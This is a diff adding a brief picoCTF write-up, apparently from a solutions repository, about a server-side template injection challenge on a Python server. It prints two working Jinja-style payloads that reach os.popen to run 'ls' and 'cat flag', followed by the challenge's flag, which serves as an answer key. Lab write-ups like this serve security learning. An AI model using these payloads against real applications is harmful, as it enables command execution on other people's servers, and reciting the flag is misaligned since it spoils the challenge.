@@ -1,0 +1,2 @@
+In this challenge we need to do Server Side Template Injection. To know on which server check the server that the link is running on by using the curl -I <URL>. This is running on a pyhton severm chekc the injection templetes on the internet which i used is {{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }} to show the files and after that there is files named flag to read it {{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}.
+flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}.
